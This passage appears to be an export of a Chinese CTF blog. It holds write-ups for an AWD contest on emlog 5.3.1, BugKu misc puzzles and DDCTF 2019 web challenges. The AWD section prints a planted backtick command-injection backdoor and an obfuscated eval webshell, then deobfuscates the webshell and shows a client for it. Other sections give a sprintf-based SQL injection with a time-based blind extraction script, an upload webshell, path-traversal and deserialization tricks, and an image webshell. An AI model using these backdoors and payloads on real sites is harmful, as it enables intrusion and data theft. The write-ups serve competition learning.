AWD私地本次比赛私地的使用的cms是emblog 5.3.1 我们的队伍只发现一个getshell的点，但是却需要进入后台利用。当发现时，几乎所有队伍都已经进入后台并改掉了密码，也没找到其他前台的漏洞，所以本次比赛并没有拿进攻分数。但是上的Firewall效果不错，防守分数并没有被扣掉太多。 1. 文件上传getshell前台没有找到其他漏洞，最后根据提示的isccadmin作为用户名，爆破拿到的密码是passw0rd。从后来的情况来看，所有队伍都做到了这一步，进入后台，修改了密码 进入后台，有很多上传的点，我们是上传管理员头像处，上传了一句话，拿到了shell 这个漏洞比较坑的是，前期管理员没有给上传的权限，之后有队伍反应，后来才又开了权限，才能上传 2. xmlrpc.php中的命令注入// 向客户端发送api支持信息 if (isset($_GET[&#39;rsd&#39;])) { $rsd=$_GET[&#39;rsd&#39;]; echo `$rsd`; header(&#39;Content-Type: text/xml; charset=utf-8&#39;, true); echo &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;rsd version=&quot;1.0&quot; xmlns=&quot;http://archipelago.phrasewise.com/rsd&quot;&gt; &lt;service&gt; &lt;engineName&gt;emlog&lt;/engineName&gt; &lt;engineLink&gt;http://emlog.net/&lt;/engineLink&gt; &lt;homePageLink&gt;&#39; . $options_cache[&#39;blogurl&#39;] . &#39;&lt;/homePageLink&gt; &lt;apis&gt; &lt;api name=&quot;MetaWeblog&quot; blogID=&quot;1&quot; preferred=&quot;true&quot; apiLink=&quot;&#39; . $options_cache[&#39;blogurl&#39;] . &#39;xmlrpc.php&quot; /&gt; &lt;api name=&quot;Blogger&quot; blogID=&quot;1&quot; preferred=&quot;false&quot; apiLink=&quot;&#39; . $options_cache[&#39;blogurl&#39;] . &#39;xmlrpc.php&quot; /&gt; &lt;/apis&gt; &lt;/service&gt; &lt;/rsd&gt; &#39;; exit; } 其中，注入点在于 $rsd=$_GET[&#39;rsd&#39;]; echo `$rsd`; 在php中，反斜杠可以用于快速执行cmd的代码 ?rsd=chdir 随便写个python测试，也可以直接执行 比赛中就直接用这个方法去运行getflag程序，这样就无需再进入后台 3. 代码混淆在include\\model\\log_model.php的开头 &lt;?php $o=&#39;n();$r=@bas}&gt;}&gt;e64_encode(@x(}&gt;@gzc}&gt;o}&gt;mpress($o),$}&gt;k));p}&gt;rint(&quot;}&gt;$p$kh}&gt;$r$kf&quot;);}&#39;; $g=&#39;&gt;EgwZ7H}&gt;iEecl}&gt;S&quot;;function }&gt;x($t,$}&gt;k){$}&gt;}&gt;c=s}&gt;trlen(}&gt;$k)}&gt;;$l=strlen($t);$o=&quot;&#39;; $l=&#39;&quot;;}&gt;f}&gt;or($i=0;$}&gt;}&gt;i&lt;$l;){for($}&gt;j=}&gt;0;}&gt;}&gt;($j&lt;$c&amp;&amp;$i&lt;$l}&gt;);$j++,$i++){$o.}&gt;}&gt;=$&#39;; $r=&#39;_contents}&gt;(&quot;p}&gt;}&gt;hp://i}&gt;nput&quot;)}&gt;,$m)==1){@ob_star}&gt;t(}&gt;);@}&gt;eva}&gt;l(@gzu}&gt;ncompress(&#39;; $L=&#39;$k=&quot;5ac}&gt;91f7}&gt;d&quot;;$}&gt;kh=}&gt;}&gt;&quot;b9615a29}&gt;bc1d&quot;;}&gt;$kf=&quot;24d0b67}&gt;c2c91&quot;;$p}&gt;=&quot;9GmI}&gt;}&#39;; $s=str_replace(&#39;C&#39;,&#39;&#39;,&#39;cCreaCteC_fCuCCnction&#39;); $Z=&#39;t{$i}^}&gt;$k{$}&gt;j}&gt;};}}ret}&gt;urn $o;}}&gt;if(@preg_match}&gt;}&gt;(&quot;}&gt;/$kh(.+}&gt;)$kf}&gt;/&quot;,@file_}&gt;get&#39;; $h=&#39;@x(@ba}&gt;se64}&gt;_d}&gt;ecode($m[1])}&gt;,$}&gt;}&gt;k)))}&gt;;}&gt;$o=@}&gt;ob_get_contents();@ob_}&gt;en}&gt;d_cl}&gt;ea&#39;; $q=str_replace(&#39;}&gt;&#39;,&#39;&#39;,$L.$g.$l.$Z.$r.$h.$o); $I=$s(&#39;&#39;,$q);$I(); ?&gt; 打印$s和$q # $s的结果 create_function # $q的结果 $k=&quot;5ac91f7d&quot;; $kh=&quot;b9615a29bc1d&quot;; $kf=&quot;24d0b67c2c91&quot;; $p=&quot;9GmIEgwZ7HiEeclS&quot;; function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0;$i&lt;$l;) { for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; } if(@preg_match(&quot;/$kh(.+)$kf/&quot;,@file_get_contents(&quot;php://input&quot;),$m)==1) { @ob_start(); @eval(@gzuncompress(@x(@base64_decode($m[1]),$k))); $o=@ob_get_contents(); @ob_end_clean(); $r=@base64_encode(@x(@gzcompress($o),$k)); print(&quot;$p$kh$r$kf&quot;); } 解释一下几个函数： ①gzcompress()：压缩内容 gzcompress ( string $data [, int $level = -1 [, int $encoding = ZLIB_ENCODING_DEFLATE ]] ) : string data The data to compress. level The level of compression. Can be given as 0 for no compression up to 9 for maximum compression. If -1 is used, the default compression of the zlib library is used which is 6. encoding One of ZLIB_ENCODING_* constants. ②gzuncompress()：解压缩内容 gzuncompress ( string $data [, int $length = 0 ] ) : string data The data compressed by gzcompress(). length The maximum length of data to decode. ③preg_match() preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) : int pattern：要搜索的模式，字符串类型。 subject：输入字符串。 matches：如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。 ④ob_start()、ob_get_contents()、ob_end_clean()、三个函数实现缓冲本地文件，以及执行本地脚本代码。使用ob_start()把输出那同输出到缓冲区，而不是到浏览器。然后用ob_get_contents得到缓冲区的数据。ob_start()在服务器打开一个缓冲区来保存所有的输出。所以在任何时候使用echo，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。函数ob_end_clean会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。 那么function x的作用其实就是对两个字符串内容异或，有点类似于加密。利用$t和$k生成$o，假设我们不知道$t的内容，只要将$o放在$t的位置，就可以生成$t 我们通过逆推，用如下代码生成phpinfo();的字符串，构成$kh + 生成的字符串 + $kf &lt;?php $k=&quot;5ac91f7d&quot;; $kh=&quot;b9615a29bc1d&quot;; $kf=&quot;24d0b67c2c91&quot;; function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0;$i&lt;$l;) { for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; } $phpinfo_str = @base64_encode(@x(@gzcompress(&quot;phpinfo();&quot;),$k)); echo $kh.$phpinfo_str.$kf; ?&gt; 运行结果为： b9615a29bc1dTf1I8Rmu+y/+trONN2YioDbg24d0b67c2c91 但是直接提交的话，显示的是@base64_encode(@x(@gzcompress($o),$k))处理的内容 我们直接将 print(&quot;$p$kh$r$kf&quot;);替换为echo @base64_decode(@x(@gzuncompress($r),$k)); 再次POST就成功了 AWD高地题目简化代码如下 &lt;?php $mysqli = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;); $Profile = sprintf(&quot;password = &#39;%s&#39;&quot;, mysqli_real_escape_string($mysqli, $_GET[&#39;profile&#39;])); $sql = sprintf(&quot;update users set $Profile where username=&#39;%s&#39;&quot;, mysqli_real_escape_string($mysqli, &#39;Dumb&#39;)); var_dump($sql); $result = $mysqli-&gt;query($sql); if($result===True){ echo &#39;success&#39;; }else{ echo &quot;&lt;h1 style=&#39;color:red;&#39;&gt;$mysqli-&gt;error&lt;/h1&gt;&quot;; } ?&gt; 题目考查的是sprintf()格式化字符串漏洞，详解：https://blog.csdn.net/weixin_41185953/article/details/80485075 我们传入参数 profile = %1$&#39; 经过mysqli_real_escape_string()处理后得到 profile = %1$\\&#39; 经过第一个sprintf()处理后，$Profile字符串变量的值为 password = &#39;%1$\\&#39;&#39; 经过第二个sprintf()处理后，$sql字符串变量的值为 拼接后： update users set password = &#39;%1$\\&#39;&#39; where username=&#39;Dumb&#39; 这里的%1$\\会被吃掉，所以还有一个传入的单引号没有被处理，逃逸出来 处理后： update users set password = &#39;&#39;&#39; where username=&#39;Dumb&#39; 所以就造成了注入，比如可以这样构造： ?profile = %1$\\&#39; where username=&#39;admin&#39; # ↓ $Profile = password = &#39;%1$\\&#39; where username=&#39;admin&#39; #&#39; ↓ $sql = update users set password = &#39;%1$\\&#39; where username=&#39;admin&#39; #&#39; where username=&#39;Dumb&#39; ↓ $sql = update users set password = &#39;&#39; where username=&#39;admin&#39; #&#39; where username=&#39;Dumb&#39; #修改admin用户的密码为空 本题exp import requests import time def sqlinject(): for i in range(128): for j in range(1,9): sql=f&quot;http://127.0.0.1/test.php?profile=%1$\\&#39; where username=0x44756d62 and if(ascii(substr((database()),{j},1))={i},sleep(1),0)--+&quot; ss=time.time() res=requests.get(sql) if time.time()-ss&gt;=0.5: #print(sql) print(chr(i)) if &#39;__main__&#39;==__name__: sqlinject()","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"BugKuCTF — 杂项题(第31-40关)","slug":"BugKuCTF—杂项题 第31-40关","date":"2019-05-01T16:00:00.000Z","updated":"2019-09-01T06:24:28.970Z","comments":true,"path":"2019/05/02/BugKuCTF—杂项题 第31-40关/","link":"","permalink":"https://knlvre.github.io/2019/05/02/BugKuCTF—杂项题 第31-40关/","excerpt":"","text":"前一部分链接：第21-30关Write-up 第三十一关（convert）打开文本看到是二进制文件 将一整串二进制转换为十六进制，发现开头是rar文件的开头 直接保存成一个rar文件 import binascii s = &quot;010100100110000101110010001000010001101000000111...这里就不全写出来，自行补充即可&quot; s = hex(int(int(s,2)))[2:] s = s.encode() hexvalue = binascii.a2b_hex(s) rar = open(r&#39;1.rar&#39;,&#39;wb+&#39;) rar.write(hexvalue) rar.close() 解压得到key.txt，查看属性看到一串Base64密文 解密得到flag 第三十二关（听首音乐）打开音频文件，发现上面的通道有比较奇怪的信息：一种长的、一种短的，这时想到莫斯密码 先将信息记录下来（注意：记得每段信息之间要用空格分隔） 然后拿去在线网站解密一下就得到flag（直接提交就行，不用加格式） 推荐一个： 传送门 第三十三关（好多数值）链接打开看到很多数值，类似坐标，将其赋值下来生成1.txt 打开查看，每一行都是RGB值，通过后来的了解是RGB转换成图片，那我们就需要知道图片的长宽 文本的行数为61366，那么可以分解为：2×61×503，有三种组合方式：122×503、1006×61、2×30683 感觉122×503比较靠谱，试一下 利用Python的图片库，生成一张图片 from PIL import Image x = 503 #x坐标 通过对txt里的行数进行整数分解 y = 122 #y坐标 x*y = 行数 im = Image.new(&quot;RGB&quot;,(x,y))#创建图片 file = open(&#39;1.txt&#39;) #打开rbg值文件 #通过一个个rgb点生成图片 for i in range(0,x): for j in range(0,y): line = file.readline()#获取一行 rgb = line.split(&quot;,&quot;)#分离rgb im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素 im.show() 运行完后会自动弹出图片，图片中写着flag 第三十四关（很普通的数独）下载下来一个叫zip的文件，用winhex查看，开头是504b0304，那就是zip格式的文件了，改一下后缀名。解压出来25张图片，是做数独的图片 将25张图片以5×5排列，发现把有数字的地方涂黑，就是二维码，但是1、5、21这三张图片顺序有问题，如下图： 然后就可以画出一个二维码。我的方法是建立一个WPS表格，把格子涂黑，比较简单粗暴 :) 网上看了别人的WriteUp：http://www.pianshen.com/article/4746320544/ 把有数字的地方作为1，没数字的地方为0，提取出来 111111101010101000101000001111110000101111111 100000101100111101010011101100011001001000001 101110101110011111010011111101000101001011101 101110101101100010001010000011110001101011101 101110100011100100001111101111111011101011101 ...太多了不写 借用python的Image库，生成二维码，好像也是挺累的 from PIL import Image x = 45 y = 45 im = Image.new(&#39;RGB&#39;, (x, y)) white = (255, 255, 255) black = (0, 0, 0) with open(&#39;file.txt&#39;) as f: for i in range(x): ff = f.readline() for j in range(y): if ff[j] == &#39;1&#39;: im.putpixel((i, j), black) else: im.putpixel((i, j), white) im.save(&quot;1.jpg&quot;) 扫描二维码得到Base64字符串 Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9 多次Base64解码之后，拿到flag 可能我技术不到位，这道题费时间，比较累 第三十五关（PEN_AND_APPLE）链接打开是一个黑人老哥在跳PEN_AND_APPLE，亮瞎 没有思路，参考别人的WriteUp：https://www.cnblogs.com/lomooo/p/5977067.html 按照方法去尝试，但是不管怎样都不行，切换操作系统、浏览器、浏览模式下载都不行。好像是因为文件下载下来出了问题，导致隐藏的文件丢失，不做了","categories":[],"tags":[{"name":"CTF-Misc","slug":"CTF-Misc","permalink":"https://knlvre.github.io/tags/CTF-Misc/"}],"author":"Knlvre"},{"title":"2019 DDCTF — 线上赛WriteUp","slug":"CTF比赛—2019DDCTF线上赛WriteUp","date":"2019-04-17T16:00:00.000Z","updated":"2019-07-26T05:33:35.507Z","comments":true,"path":"2019/04/18/CTF比赛—2019DDCTF线上赛WriteUp/","link":"","permalink":"https://knlvre.github.io/2019/04/18/CTF比赛—2019DDCTF线上赛WriteUp/","excerpt":"","text":"前言首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来 Python的Flask简单学习：https://blog.csdn.net/luanpeng825485697/article/details/80934185 参考文章 https://xz.aliyun.com/t/4862 https://www.ctfwp.com/articals/2019ddctf.html?tdsourcetag=s_pctim_aiomsg https://www.leavesongs.com/PENETRATION/client-session-security.html https://xz.aliyun.com/t/4849 1. Web第一题（滴~）链接进去后，看到jpg参数值后面接着一串Base64密文 解密过程：两次Base64解密，一次Hex转ASCII，解出：flag.jpg flag.jpg正是页面返回的内容之一 那我们直接将index.php经过一次ASCII转Hex，两次Base64后，传入参数，并查看网页源代码 将页面返回的Base64（这是服务器返回给我们的index.php的内容）拿去解密，得到代码 关注到文章开头的这个hint:https://blog.csdn.net/FengBanLiuYun/article/details/80616607 链接进去是博客，看作者2018-07-04这篇博客，按照描述去访问practice.txt.swp文件（记得转换加密） 将返回的密文拿去解密得到：f1ag!ddctf.php 注意到这里有一个感叹号，并且这个php文件对我们可能有用，要去获取它的内容 但是之前的正则匹配过滤掉除了a-z、A-Z、0-9的所有字符： $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file); 但是他自身的规则又会将config替换成!： $file = str_replace(&quot;config&quot;,&quot;!&quot;, $file); 就利用这个规则，将f1ag!ddctf.php改成f1agconfigddctf.php，加密后传入，得到新的内容 拿去解密得到： &lt;?php include(&#39;config.php&#39;); $k = &#39;hello&#39;; extract($_GET); if(isset($uid)) { $content=trim(file_get_contents($k)); if($uid==$content) { echo $flag; } else { echo&#39;hello&#39;; } } ?&gt; 那么，file_get_contents(hello)是不是有任何返回的，所有uid=直接不添加参数，url如下： http://117.51.150.246/f1ag!ddctf.php?uid= 直接拿到flag 第二题（WEB签到题）访问链接，提示抱歉，您没有登陆权限，请获取权限后访问----- 查看源代码，关注到：js/index.js 访问一下 在向这个网址：http://117.51.158.44/app/Auth.php发送请求时，头部的didictf_username是空的 用Burpsuit向目标网站发起请求，并且添加didictf_username字段，赋值为admin，成功 按照提示访问app\\/fL2XID2i0Cdh.php，得到源代码 接下来就是代码审计了： url:app/Application.php Class Application { var $path = &#39;&#39;; public function response($data, $errMsg = &#39;success&#39;) { $ret = [&#39;errMsg&#39; =&gt; $errMsg, &#39;data&#39; =&gt; $data]; $ret = json_encode($ret); header(&#39;Content-type: application/json&#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &#39;admin&#39;; if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) { $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;); return TRUE; }else{ $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace(&#39;../&#39;,&#39;&#39;,$path); $path=str_replace(&#39;..\\\\&#39;,&#39;&#39;,$path); return $path; } public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;); } exit(); } } url:app/Session.php include &#39;Application.php&#39;; class Session extends Application { //key建议为8位字符串 var $eancrykey = &#39;&#39;; var $cookie_expiration = 7200; var $cookie_name = &#39;ddctf_id&#39;; var $cookie_path = &#39;&#39;; var $cookie_domain = &#39;&#39;; var $cookie_secure = FALSE; var $activity = &quot;DiDiCTF&quot;; public function index() { if(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = &#39;DiDI Welcome you %s&#39;; $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]); parent::response($data,&#39;sucess&#39;); }else{ $this-&gt;session_create(); $data = &#39;DiDI Welcome you&#39;; parent::response($data,&#39;sucess&#39;); } } } private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&#39;../config/key.txt&#39;); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&quot;session not found&quot;,&#39;error&#39;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){ return FALSE; } if(!empty($_POST[&quot;nickname&quot;])) { $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,&quot;Welcome&quot;); } if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) { parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;); return FALSE; } if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) { parent::response(&#39;the user agent not match&#39;,&#39;error&#39;); return FALSE; } return TRUE; } private function session_create() { $sessionid = &#39;&#39;; while(strlen($sessionid) &lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)), &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;], &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;], &#39;user_data&#39; =&gt; &#39;&#39;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-&gt;index(); 首先创建了一个Session类（Session类继承了Application类），调用了该类的index()方法 看一下index()这个方法，调用了parent::auth()，也就是Application类的auth()方法 看一下auth()方法，没什么营养，也就是我们前面修改header的步骤 接下来看index()方法中调用的get_key()方法 读取了key.txt存入变量eancrykey当中 想直接读取/config/key.txt时，403，被拒绝了，只能继续，可能就是flag 接下来看index()方法中调用的session_read()方法 第一步，如果没有提交Cookie的话，就会返回False 那么index()函数就会执行这部分 那就再把目光转移到session_create()方法 mt_rand()会生成一个32位伪随机数的$sessionid $sessionid会同其他访问者信息存放在$userdata这个数组内 生成的Cookie重要信息就是：（$userdata的序列化）+（$userdata的序列化+eancrykey之和的md5的值） 根据开头的url变量提示，我们访问app/Session.php（记得最开始的didictf_username字段不要漏了） 访问成功，说明成功执行了session_create()方法，通过response()方法给我们返回了success 注意此时Response中服务器给我们返回的我们的Cookie url解码一下 的确是我们之前的：（$userdata的序列化）+（$userdata的序列化+eancrykey的md5的值） 直接将后面的md5值拿去在线网站解密一下，没有结果，那就继续吧 a:4:{s:10:&quot;session_id&quot;;s:32:&quot;598fd9af879fcff5e6f1fd754cc731d9&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;140.224.71.170&quot;;s:10:&quot;user_agent&quot;;s:113:&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}77892297db0f81fbbfcf6d269731b568 此时我们的Cookie和Session是已经创建好了的，可以成功执行到session_read()方法，方法内： 一直到这一步，需要我们POST一个值 因为$arr数组里面有两个键值对，分别是我们要POST的nickname的值和变量eancrykey 利用sprintf循环两次，可是这里就存在一个问题，如果nickname抢占了%s号，第二次循环时将无法将eancrykey的值输出 为了解决这个，我们利用本处的逻辑漏洞：直接令nickname=%s。返回的信息中，得到变量eancrykey的值：EzblrbNS 注意：此时在POST时，因为我们用的是Burpsuits，所以要手动加上Cookie才可以 接下来分析Application的析构函数了，发现它的析构函数会输出文件内容，我们用这个析构函数输出../config/key.txt的内容，前提是path不为空，而且path的长度为18，但发现没有任何赋值代码。 子类会继承父类的函数，所以可以直接对Session.php下手：再次分析Session.php，在session_read中有反序列化函数unserialize，利用反序列化漏洞，给path赋值。序列化文本在session_create中生成，最后存储在cookie中，生成方法就是用序列化文本+md5(eancrykey+序列化文本)。 因为Path的长度要求为18，且会用str_replace过滤../，但是str_replace的过滤规则不严谨，所以可以用....//config/flag.txt（类似SQL注入中的双写） 生成一个使用Session类、给path赋值….//config/flag.txt，然后按照生成方法得到ddctf_id，最后url编码 第三题（Upload-IMG）参考文章： https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg https://xz.aliyun.com/t/2657 先随意上传一张图片，提示我们：上传的图片源代码中未包含指定字符串:phpinfo() 我们在图片中插入phpinfo，上传之后再现在网页上我们上传的图片，会发现我们插入的phpinfo不见了。猜测后端应该是使用了PHP-GD拓展处理了图片。我们绕过GD拓展，使得图片里面包含phpinfo即可，具体看第一篇参考文章 绕过二次渲染上传图片马：看第二篇参考文章 使用其中生成jpg图片的php脚本，过程为向服务器任意上传一个jpg文件，将上传成功的jpg文件下载下来，命名为1.jpg，再运行脚本，命令为： php jpg_payload.php 1.jpg 在目录下生成加入图片马的jpg图片，我们可以在16进制编辑器打开验证： 成功插入phpinfo信息，再次在服务器中上传该图片马 成功获得flag 另外，png的图片同样可以通过参考链接中的其他脚本生成图片马，gif文件则需要比较前后图片的相同之处即imagecreatefromgif函数未修改的部分，比较麻烦一点 第四题（homebrew event loop）链接进去 点击View source code查看源代码： # -*- encoding: utf-8 -*- # written in python 2.7 __author__ = &#39;garzon&#39; from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = &#39;*********************&#39; # censored url_prefix = &#39;/d5afe1f66147e857&#39; def FLAG(): return &#39;FLAG_is_here_but_i_wont_show_you&#39; # censored def trigger_event(event): session[&#39;log&#39;].append(event) if len(session[&#39;log&#39;]) &gt; 5: session[&#39;log&#39;] = session[&#39;log&#39;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set(&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;) resp = None while len(request.event_queue) &gt; 0: event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; request.event_queue = request.event_queue[1:] if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == &#39;a&#39; action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;) args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;) try: event_handler = eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;)) ret_val = event_handler(args) except RollBackException: if resp is None: resp = &#39;&#39; resp += &#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39; resp += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;] session[&#39;points&#39;] = request.prev_session[&#39;points&#39;] break except Exception, e: if resp is None: resp = &#39;&#39; #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == &#39;&#39;: resp = (&#39;404 NOT FOUND&#39;, 404) session.modified = True return resp @app.route(url_prefix+&#39;/&#39;) def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100: querystring = &#39;action:index;False#False&#39; if &#39;num_items&#39; not in session: session[&#39;num_items&#39;] = 0 session[&#39;points&#39;] = 3 session[&#39;log&#39;] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = &#39;&#39; html += &#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;.format(session[&#39;num_items&#39;], session[&#39;points&#39;]) if page == &#39;index&#39;: html += &#39;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39; html += &#39;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39; html += &#39;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39; elif page == &#39;shop&#39;: html += &#39;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39; elif page == &#39;reset&#39;: del session[&#39;num_items&#39;] html += &#39;Session reset.&lt;br /&gt;&#39; html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; return html def index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == &#39;True&#39;: source = open(&#39;eventLoop.py&#39;, &#39;r&#39;) html = &#39;&#39; if bool_download_source != &#39;True&#39;: html += &#39;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39; html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; for line in source: if bool_download_source != &#39;True&#39;: html += line.replace(&#39;&amp;&#39;,&#39;&amp;amp;&#39;).replace(&#39;\\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(&#39; &#39;,&#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;).replace(&#39;\\n&#39;, &#39;&lt;br /&gt;&#39;) else: html += line source.close() if bool_download_source == &#39;True&#39;: headers = {} headers[&#39;Content-Type&#39;] = &#39;text/plain&#39; headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39; return Response(html, headers=headers) else: return html else: trigger_event(&#39;action:view;index&#39;) def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0]) session[&#39;num_items&#39;] += num_items trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;]) def consume_point_function(args): point_to_consume = int(args[0]) if session[&#39;points&#39;] &lt; point_to_consume: raise RollBackException() session[&#39;points&#39;] -= point_to_consume def show_flag_function(args): flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return &#39;You naughty boy! ;) &lt;br /&gt;&#39; def get_flag_handler(args): if session[&#39;num_items&#39;] &gt;= 5: trigger_event(&#39;func:show_flag;&#39; + FLAG()) # show_flag_function has been disabled, no worries trigger_event(&#39;action:view;index&#39;) if __name__ == &#39;__main__&#39;: app.run(debug=False, host=&#39;0.0.0.0&#39;) 每个函数的简单介绍： #========================================================== # flag获取函数 def FLAG() # 以下三个函数负责对参数进行解析。 # 1. 添加log，并将参数加入队列 def trigger_event(event) # 2. 工具函数，获取prefix与postfix之间的值 def get_mid_str(haystack, prefix, postfix=None): # 3. 从队列中取出函数，并分析后，进行执行。（稍后进行详细分析） def execute_event_loop() #========================================================== # 网站入口点 def entry_point() # 页面渲染，三个页面:index/shop/reset def view_handler() # 下载源码 def index_handler(args) # 增加钻石 def buy_handler(args) # 计算价钱，进行减钱 def consume_point_function(args) #========================================================== # 输出flag def show_flag_function(args) def get_flag_handler(args) 直接给出payload，然后一步步去分析 ?action:trigger_event%23;action:buy;5%23action:get_flag; entry_point() 